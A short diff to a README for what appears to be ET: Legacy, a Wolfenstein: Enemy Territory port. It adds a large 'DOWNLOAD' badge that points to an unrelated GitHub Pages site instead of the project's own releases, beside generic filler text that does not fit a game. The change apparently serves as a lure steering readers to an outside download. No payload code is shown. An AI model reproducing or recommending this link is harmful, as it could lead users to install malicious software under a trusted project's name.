@@ -30,6 +30,12 @@ ET: Legacy is a community-maintained port of Wolfenstein: Enemy Territory with a
 
 Whether you're a newcomer or a veteran, ET: Legacy provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download ET: Legacy](https://img.shields.io/badge/⬇_DOWNLOAD_ET:+Legacy-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
